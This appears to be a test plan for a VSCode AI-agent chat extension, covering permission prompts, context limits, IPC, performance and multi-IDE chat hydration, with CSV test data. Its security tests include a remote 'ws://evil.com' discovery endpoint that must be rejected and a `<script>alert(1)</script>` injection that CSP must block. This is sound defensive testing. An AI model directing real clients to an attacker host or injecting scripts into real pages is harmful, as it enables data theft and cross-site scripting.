|------|--------|----------|
| 1 | Agent requests write_file tool (dangerous) | PermissionGuard shown |
| 2 | Verify modal shows tool name, args, risk | Info displayed |
| 3 | Click Allow | Tool executes, result shown |

---

### UI-PG-02: Permission Timeout Auto-Deny

| Step | Action | Expected |
|------|--------|----------|
| 1 | Agent requests dangerous tool | Guard with countdown |
| 2 | Wait 60 seconds | Auto-denied |
| 3 | Notification shown | "Permission timed out" |

---

### UI-PG-03: Allow All Session

| Step | Action | Expected |
|------|--------|----------|
| 1 | Approve write tool with "Allow All Session" | |
| 2 | Next write tool request | Auto-approved, no guard |
| 3 | Shell tool request | Guard shown (different type) |

---

### UI-CTX-01: Badge Pulse at >80%

| Step | Action | Expected |
|------|--------|----------|
| 1 | Context reaches 85% capacity | |
| 2 | Observe ContextBadge | Pulse animation active |
| 3 | Color changes to yellow | Visual indicator |

---

### UI-CTX-02: Auto-Suggest at >90% and Unpin

| Step | Action | Expected |
|------|--------|----------|
| 1 | Context reaches 92% capacity | |
| 2 | Observe badge area | Prune suggestions shown |
| 3 | Click suggested file to unpin | Token count decreases |
| 4 | Badge updates to lower percentage | Visual feedback |

---

### UI-CTX-03: /clear Resets Context

| Step | Action | Expected |
|------|--------|----------|
| 1 | Type /clear in input | |
| 2 | Confirm dialog appears | "Clear all context?" |
| 3 | Click Confirm | Context reset, badge shows 0% |

---

### UI-TLB-01: Terminal Log Streams with Height Limit

| Step | Action | Expected |
|------|--------|----------|
| 1 | Agent executes shell tool | TerminalLogBlock appears |
| 2 | Output streams in real-time | Text appears incrementally |
| 3 | Check height | Max 300px, scrollable |
| 4 | Verify monospace font | Correct rendering |

---

### UI-TLB-02: Terminal Collapses After Completion

| Step | Action | Expected |
|------|--------|----------|
| 1 | Shell tool completes | |
| 2 | TerminalLogBlock collapses | Summary visible |
| 3 | Summary shows exit code + duration + last 3 lines | Correct info |
| 4 | Click to expand | Full log visible |

---

### UI-DL-01: Deep Link Button Opens External IDE

| Step | Action | Expected |
|------|--------|----------|
| 1 | Tool result contains deepLinkUri | |
| 2 | "Open in AntiGravity" button visible | Button rendered |
| 3 | Click button | External URI opened |

---

### UI-ART-01: Artifact Detection and Button

| Step | Action | Expected |
|------|--------|----------|
| 1 | Shell output contains "target/site/serenity/index.html" | |
| 2 | After collapse, artifact button rendered | "View Test Report" |
| 3 | Click button | File opens |

---

### UI-IPC-01: Service Connected Green Indicator

| Step | Action | Expected |
|------|--------|----------|
| 1 | Kiro service running, discovery file present | |
| 2 | Extension connects via WebSocket | |
| 3 | Green indicator in header | Connected state |

---

### UI-IPC-02: Service Offline Auto-Start

| Step | Action | Expected |
|------|--------|----------|
| 1 | Service offline, all retries exhausted | Warning bar shown |
| 2 | Click "Auto-start" button | Terminal spawned |
| 3 | Service starts and reconnects | Warning disappears |

---

### UI-REG-01: Agent Hot-Reload in Dropdown

| Step | Action | Expected |
|------|--------|----------|
| 1 | Open agent dropdown | Shows current agents |
| 2 | Add new agent .md file to workspace | |
| 3 | Within 2 seconds | New agent appears in dropdown |

---

### UI-PERF-01: 1000 Messages Smooth Scroll

| Step | Action | Expected |
|------|--------|----------|
| 1 | Load chat with 1000 messages | |
| 2 | Scroll rapidly up and down | |
| 3 | Measure FPS | Maintains 60fps |
| 4 | No jank or lag | Smooth experience |

---

### UI-A11Y-01: Keyboard Navigation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Tab from input to send button | Focus moves |
| 2 | Tab to agent selector | Focusable |
| 3 | Tab to context badge | Focusable |
| 4 | Tab through diff buttons (Accept/Reject) | All reachable |
| 5 | Enter activates focused button | Action triggered |
| 6 | Escape closes permission modal | Modal dismissed |

---

## 6. SIT -- System Integration Tests

### SIT-PERF-01: Bundle Size Check

| Step | Action | Expected |
|------|--------|----------|
| 1 | Run `vite build` | Production build |
| 2 | Measure `gzip -c dist/webview.js | wc -c` | Bytes output |
| 3 | Verify size | <= 15360 bytes (15KB) |

**BR:** BR-15

---

### SIT-PERF-02: First Render Timing

| Step | Action | Expected |
|------|--------|----------|
| 1 | Open Chrome DevTools Performance tab | |
| 2 | Open chat panel (fresh) | |
| 3 | Measure First Contentful Paint | < 100ms |

**BR:** BR-16

---

### SIT-PERF-03: Extension Activation Impact

| Step | Action | Expected |
|------|--------|----------|
| 1 | Open VSCode with extension disabled | |
| 2 | Enable extension, measure activation time | |
| 3 | Check Extension Host startup log | activationTime < 200ms |

**BR:** BR-17

---

### SIT-PERF-04: 1000 Messages Scroll Performance

| Step | Action | Expected |
|------|--------|----------|
| 1 | Generate 1000 chat messages | |
| 2 | Open FPS meter (Chrome DevTools Rendering) | |
| 3 | Scroll rapidly through messages | |
| 4 | Verify FPS | Stable 60fps, no drops below 30 |

**BR:** BR-18

---

### SIT-PERF-05: Diagram Renderer Bundle Impact

| Step | Action | Expected |
|------|--------|----------|
| 1 | Build with DiagramRenderer included | |
| 2 | Build without DiagramRenderer | |
| 3 | Compare gzipped bundle sizes | Difference <= 5KB |

**BR:** BR-29

---

### SIT-CTX-01: Badge Visual States

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set context to 50% | Green progress bar |
| 2 | Set context to 82% | Yellow + pulse animation |
| 3 | Set context to 95% | Red + prune suggestion visible |

**Method:** Visual inspection
**BR:** BR-08

---

### SIT-REG-01: Hot-Reload Real-Time Measurement

| Step | Action | Expected |
|------|--------|----------|
| 1 | Open agent dropdown, note agents | |
| 2 | Create new .md file in .code-intel/agents/ | Start timer |
| 3 | Refresh dropdown | |
| 4 | Measure time until new agent appears | < 2000ms |

**Method:** Stopwatch
**BR:** BR-11

---

### SIT-IPC-01: Localhost-Only Enforcement

| Step | Action | Expected |
|------|--------|----------|
| 1 | Create discovery file with ws://evil.com:8080 | |
| 2 | Monitor network tab in DevTools | |
| 3 | Verify NO connection to evil.com | Connection rejected |
| 4 | Verify warning logged | Output channel message |

**Method:** Network inspector
**BR:** BR-14

---

### SIT-SEC-01: CSP Inline Script Block

| Step | Action | Expected |
|------|--------|----------|
| 1 | Inject message content with `<script>alert(1)</script>` | |
| 2 | Open DevTools Console | |
| 3 | Verify CSP violation reported | "Refused to execute inline script" |
| 4 | Verify alert did NOT fire | No popup |

**Method:** DevTools Console inspection
**BR:** BR-24

---

### SIT-TLB-01: Terminal Monospace Rendering

| Step | Action | Expected |
|------|--------|----------|
| 1 | Execute shell tool that produces tabular output | |
| 2 | Inspect TerminalLogBlock | Monospace font |
| 3 | Verify columns align | Proper alignment |
| 4 | Verify max-height 300px | No overflow |

**Method:** Visual inspection
**BR:** BR-21

---

### SIT-A11Y-01: Screen Reader Compatibility

| Step | Action | Expected |
|------|--------|----------|
| 1 | Enable NVDA (Windows) or VoiceOver (macOS) | |
| 2 | Navigate to chat input | Announced as "Chat input" |
| 3 | Navigate to messages | Role and content read |
| 4 | Navigate to Permission Guard | Buttons announced with labels |
| 5 | Navigate to agent selector | Combobox announced |

**Method:** Manual with assistive technology
**BR:** BR-25

---

## 7. Test Data Files

### 7.1 test-data/agents.csv

```csv
id,name,description,tools,mcp_servers,auto_approve,filePath,valid
ba-agent,Business Analyst,Creates BRD and FSD,mem_search;mem_ingest,orchestrator,mem_search,.code-intel/agents/ba-agent.md,true
sa-agent,Solution Architect,Creates TDD,code_search;mem_search,orchestrator,code_search,.code-intel/agents/sa-agent.md,true
invalid-agent,,,,,,.code-intel/agents/invalid.md,false
empty-yaml,,No frontmatter,,,,.code-intel/agents/empty.md,false
```

### 7.2 test-data/diffs.csv

```csv
diffId,filePath,patch,fileHashAtGeneration,generatedAt,scenario
d001,src/utils.ts,"+export function add(a,b){return a+b}",abc123def,2026-08-01T10:00:00Z,clean-apply
d002,src/app.ts,"+import {add} from './utils'",111222333,2026-08-01T09:50:00Z,stale-5min
d003,src/config.ts,"+const PORT=3000",aaa000bbb,2026-08-01T10:00:00Z,concurrent-mod
d004,src/deleted.ts,"+// new code",xxx999yyy,2026-08-01T10:00:00Z,file-deleted
```

### 7.3 test-data/tools.csv

```csv
toolId,name,type,requiresApproval,args,scenario
t001,read_file,read,false,"{""path"":""src/a.ts""}",safe-auto-approve
t002,write_file,write,true,"{""path"":""src/b.ts"",""content"":""hello""}",dangerous-needs-approval
t003,shell_execute,shell,true,"{""command"":""npm test""}",dangerous-shell
t004,search_code,search,false,"{""query"":""function""}",safe-search
t005,delete_file,delete,true,"{""path"":""tmp/old.ts""}",dangerous-delete
t006,git_commit,git,true,"{""message"":""fix""}",dangerous-git
```

### 7.4 test-data/messages.csv

```csv
seq,type,messageId,agentId,token,errorCode,recoverable,scenario
1,STREAM_START,m001,ba-agent,,,normal-flow
2,STREAM_TOKEN,m001,,Hello,,,,normal-flow
3,STREAM_TOKEN,m001,," World",,,,normal-flow
4,STREAM_END,m001,,,,,normal-flow
5,STREAM_START,m002,sa-agent,,,error-flow
6,STREAM_TOKEN,m002,,Partial,,,,error-flow
7,STREAM_ERROR,m002,,,LLM_TIMEOUT,true,error-flow
8,STREAM_START,m003,qa-agent,,,non-recoverable
9,STREAM_ERROR,m003,,,CONTEXT_OVERFLOW,false,non-recoverable
```

### 7.5 test-data/ipc-services.csv

```csv
service,ws_endpoint,rest_endpoint,pid,status,version,valid,scenario
kiro,ws://localhost:8765,http://localhost:8766,12345,running,1.0.0,true,normal-connect
antigravity,ws://localhost:9876,http://localhost:9877,67890,running,2.1.0,true,dual-connect
evil,ws://evil.com:8080,http://evil.com:8081,99999,running,1.0.0,false,reject-remote
invalid,not-a-url,also-not-url,0,stopped,,false,invalid-json
missing-pid,ws://localhost:7777,http://localhost:7778,,running,1.0.0,false,no-pid
```

### 7.6 test-data/diagrams.csv

```csv
diagramId,type,source,expectSvg,scenario
dgr001,plantuml,"@startuml\nAlice -> Bob: hello\n@enduml",true,simple-sequence
dgr002,plantuml,"@startuml\nclass A\n@enduml",true,simple-class
dgr003,plantuml,"invalid plantuml",false,fallback-source-display
dgr004,bpmn,"<definitions>...</definitions>",false,unsupported-graceful
```


---

## 8. [v3] Backend-Driven State — Hydration & Multi-IDE Sync Tests

> Added in STP v2.0 for BR-30, BR-31, UC-11, Phase 0 Backend Tasks.

---

### 8.1 PBT — Property-Based Tests

#### PBT-HYD-01: thread_id (từ Backend KB createThread) Always Valid UUID v4

| Attribute | Value |
|-----------|-------|
| **Property** | Any thread_id returned by Backend Knowledge Service `POST /api/v1/threads` must match UUID v4 format (`/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i`) |
| **Generator** | `fc.record({ thread_id: fc.uuid() })` for valid; `fc.string(0,100)` for invalid |
| **Runs** | 500 |
| **Framework** | fast-check + Vitest |
| **BR** | BR-31 |

```typescript
test.prop([fc.uuid()])('backend thread_id is always valid UUID v4', (uuid) => {
  const thread = { thread_id: uuid, started_at: new Date().toISOString() };
  const parsed = parseThreadJson(JSON.stringify(thread));
  expect(parsed.thread_id).toMatch(
    /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
  );
});

test.prop([fc.string(0, 100)])('invalid thread_id is rejected', (badId) => {
  fc.pre(!badId.match(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i));
  const thread = { thread_id: badId };
  const result = validateThreadJson(JSON.stringify(thread));
  expect(result.valid).toBe(false);
});
```

---

### 8.2 UT — Unit Tests

#### UT-HYD-01: chatStore Hydration from SYNC_CHAT_HISTORY

| Step | Action | Expected |
|------|--------|----------|
| 1 | Initialize empty chatStore | messages = [], isHydrated = false |
| 2 | Dispatch SYNC_CHAT_HISTORY with 5 messages + context | |
| 3 | Verify chatStore.messages.length | 5 |
| 4 | Verify each message has correct fields (id, role, content, agentId, timestamp) | All fields populated |
| 5 | Verify chatStore.isHydrated = true | Flag set |
| 6 | Verify contextStore populated from payload.context | tokenCount, files match |

**Test Data:** sessions.csv row 1 (valid-hydration)
**BR:** BR-30, UC-11

---

#### UT-HYD-02: REQUEST_SYNC_STATE Sent on Svelte onMount

| Step | Action | Expected |
|------|--------|----------|
| 1 | Mock postMessage API | Spy attached |
| 2 | Mount ChatPanel component | Component renders |
| 3 | Verify postMessage called with {type: 'REQUEST_SYNC_STATE'} | Called once on mount |
| 4 | Verify call happens before any user interaction | First postMessage call |

**BR:** BR-30, UC-11

---

#### UT-HYD-03: Thread Resolution — Backend KB (createThread / listThreads)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Mock Backend KB with existing thread for workspace | Thread exists |
| 2 | Call resolveActiveThread() | Returns thread_id (UUID) |
| 3 | Verify thread_id is used for hydration | Correct UUID |
| 4 | Mock Backend KB with no active thread | No thread |
| 5 | Call resolveActiveThread() | Creates new thread via POST /api/v1/threads |
| 6 | Mock Backend KB unreachable | Request fails |
| 7 | Call resolveActiveThread() | Returns error + retry state (no crash) |

**Test Data:** sessions.csv rows 1-4
**BR:** BR-31

---

### 8.3 IT — Integration Tests

#### IT-HYD-01: Full Hydration Flow (REQUEST_SYNC_STATE → Backend KB → SYNC_CHAT_HISTORY → Store)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Backend KB has existing thread with thread_id='tid-001' | Thread exists |
| 2 | Start mock LangGraph backend (RemoteCheckpointer) with checkpointed state for 'tid-001' | Backend ready |
| 3 | Webview mounts, sends REQUEST_SYNC_STATE | Message received by host |
| 4 | Extension Host resolves active thread_id from Backend KB | 'tid-001' |
| 5 | Extension Host calls GET /api/v1/threads/tid-001/messages on backend | Returns 3 messages |
| 6 | Extension Host sends SYNC_CHAT_HISTORY to webview | Payload contains messages + context |
| 7 | Verify chatStore.messages.length = 3 | Populated |
| 8 | Verify chatStore.isHydrated = true | Hydration complete |
| 9 | Verify UI auto-scrolls to bottom | scrollTop at max |

**BR:** BR-30, BR-31, UC-11

---

#### IT-HYD-02: Pub/Sub Broadcast to Multiple Connected Clients

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start mock backend with Pub/Sub enabled | |
| 2 | Connect Client A (WebSocket) with thread_id='shared-001' | Connected |
| 3 | Connect Client B (WebSocket) with thread_id='shared-001' | Connected |
| 4 | Backend streams STREAM_TOKEN for thread 'shared-001' | |
| 5 | Verify Client A receives STREAM_TOKEN | Token received |
| 6 | Verify Client B receives STREAM_TOKEN | Same token received |
| 7 | Verify timing difference between A and B | < 50ms (near-simultaneous) |
| 8 | Disconnect Client A | |
| 9 | Backend streams another token | |
| 10 | Verify Client B still receives | Token received |
| 11 | Verify Client A does NOT receive (disconnected) | No message |

**BR:** BR-30, UC-11 (Pub/Sub Broadcasting)

---

#### IT-HYD-03: RemoteCheckpointer HTTP Persistence (Write → Restart → Read)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start Backend Knowledge Service (mock or real) | Service running |
| 2 | Configure LangGraph engine with RemoteCheckpointer pointing to backend `/api/v1/threads/:id/checkpoint` | RemoteCheckpointer wired |
| 3 | Run graph with thread_id='persist-001', process 2 messages | State saved to backend |
| 4 | Verify PUT /api/v1/threads/persist-001/checkpoint was called | HTTP request sent |
| 5 | Destroy orchestrator instance (simulate restart) | Instance gone |
| 6 | Create new orchestrator instance with same RemoteCheckpointer | New instance |
| 7 | Call getThreadState('persist-001') (GET checkpoint from backend) | Returns state |
| 8 | Verify returned state contains 2 messages with correct content | Data intact |
| 9 | Verify context (IDE state) preserved in checkpoint | Context matches |

**BR:** BR-30 (Backend KB = SoT), TDD Phase 0.5

---

#### IT-HYD-04: interrupt() Pauses Graph, resume() Continues

| Step | Action | Expected |
|------|--------|----------|
| 1 | Configure graph with DangerousTool node that calls interrupt() | Graph ready |
| 2 | Run graph with dangerous tool invocation | |
| 3 | Verify graph pauses at interrupt point | State = 'interrupted' |
| 4 | Verify TOOL_CALL_REQUEST sent to client | Approval request |
| 5 | Send approval (resume with {decision: 'APPROVE'}) | |
| 6 | Verify graph resumes from interrupt point | Continues execution |
| 7 | Verify tool executes and result returned | MCP_TOOL_RESULT |
| 8 | Send rejection (resume with {decision: 'REJECT'}) on second interrupt | |
| 9 | Verify graph skips tool and continues | Error path taken |

**BR:** BR-30, Phase 0.4 (interrupt for Dangerous Tools)

---

### 8.4 E2E-API — Protocol Contract Tests

#### API-HYD-01: REQUEST_SYNC_STATE Contract Validation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Webview sends {type: 'REQUEST_SYNC_STATE'} | |
| 2 | Validate message schema | {type: string} — minimal payload |
| 3 | Verify Extension Host acknowledges (no error response) | No STREAM_ERROR |
| 4 | Verify Extension Host responds with SYNC_CHAT_HISTORY or error | Response within 5s |
| 5 | Send REQUEST_SYNC_STATE with extra fields | Extra fields ignored, still valid |

**BR:** UC-11

---

#### API-HYD-02: SYNC_CHAT_HISTORY Contract Validation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Trigger hydration flow (REQUEST_SYNC_STATE) | |
| 2 | Receive SYNC_CHAT_HISTORY from Extension Host | |
| 3 | Validate payload schema: {type:'SYNC_CHAT_HISTORY', messages: ChatMessage[], context: ContextState} | Schema valid |
| 4 | Verify messages array: each has {id:string, role:'user'\|'assistant', content:string, agentId?:string, timestamp:string} | All fields present |
| 5 | Verify context: {tokenCount:number, maxTokens:number, files:ContextFile[]} | Schema valid |
| 6 | Verify messages ordered by timestamp (ascending) | Correct order |
| 7 | Verify empty history returns messages=[] (not undefined) | Empty array, not null |

**BR:** BR-30, UC-11

---

### 8.5 E2E-UI — Gherkin Scenarios

#### UI-HYD-01: IDE Opens → Chat History Restored Automatically

| Step | Action | Expected |
|------|--------|----------|
| 1 | Ensure backend has existing conversation (3 messages) for current thread | Pre-seeded state |
| 2 | Open VSCode with extension installed | Extension activates |
| 3 | Open chat panel | Panel visible |
| 4 | Observe chat area | Previous 3 messages displayed |
| 5 | Verify message order correct (user → assistant → user) | Chronological |
| 6 | Verify chat scrolled to bottom | Latest message visible |
| 7 | Verify no loading flicker > 200ms | Smooth hydration |
| 8 | Type new message and send | Works normally after hydration |

**BR:** BR-30, BR-31, UC-11

---

### 8.6 SIT — System Integration Tests

#### SIT-SYNC-01: Multi-IDE Sync (2 IDEs See Same Chat)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start Backend Knowledge Service (single source of truth) | Running |
| 2 | Open IDE-1 (VSCode instance 1), open chat panel | Chat empty (new thread) |
| 3 | Send message from IDE-1: "Hello from IDE 1" | Message appears, agent responds |
| 4 | Verify thread_id persisted in Backend KB (POST /api/v1/threads) | Thread exists |
| 5 | Open IDE-2 (VSCode instance 2) on same workspace | |
| 6 | Open chat panel in IDE-2 | |
| 7 | Verify IDE-2 shows same conversation (hydrated from backend KB) | "Hello from IDE 1" + response visible |
| 8 | Send message from IDE-2: "Hello from IDE 2" | |
| 9 | Verify IDE-1 receives the message via Pub/Sub broadcast | Message appears in IDE-1 |
| 10 | Verify both IDEs now show 4 messages total | Consistent state |

**Method:** Manual — 2 VSCode windows on same workspace
**BR:** BR-30, BR-31, UC-11

---

## 9. [v3.1] Test Data — thread/session payloads

### 9.1 test-data/sessions.csv

```csv
sessionId,thread_id,started_at,valid,scenario
s001,550e8400-e29b-41d4-a716-446655440000,2026-08-02T10:00:00Z,true,valid-hydration
s002,not-a-uuid,2026-08-02T10:00:00Z,false,invalid-thread-id
s003,,2026-08-02T10:00:00Z,false,missing-thread-id
s004,550e8400-e29b-41d4-a716-446655440001,,false,missing-started-at
s005,550e8400-e29b-41d4-a716-446655440002,2026-08-02T11:00:00Z,true,multi-ide-shared
```

### 9.2 test-data/hydration-messages.csv

```csv
messageId,threadId,role,content,agentId,timestamp,scenario
hm001,550e8400-e29b-41d4-a716-446655440000,user,Explain this code,,2026-08-02T10:01:00Z,hydration-3msg
hm002,550e8400-e29b-41d4-a716-446655440000,assistant,This code implements...,ba-agent,2026-08-02T10:01:05Z,hydration-3msg
hm003,550e8400-e29b-41d4-a716-446655440000,user,Can you refactor it?,,2026-08-02T10:02:00Z,hydration-3msg
hm004,550e8400-e29b-41d4-a716-446655440002,user,Hello from IDE 1,,2026-08-02T11:01:00Z,multi-ide
hm005,550e8400-e29b-41d4-a716-446655440002,assistant,Hello! How can I help?,sa-agent,2026-08-02T11:01:03Z,multi-ide
```
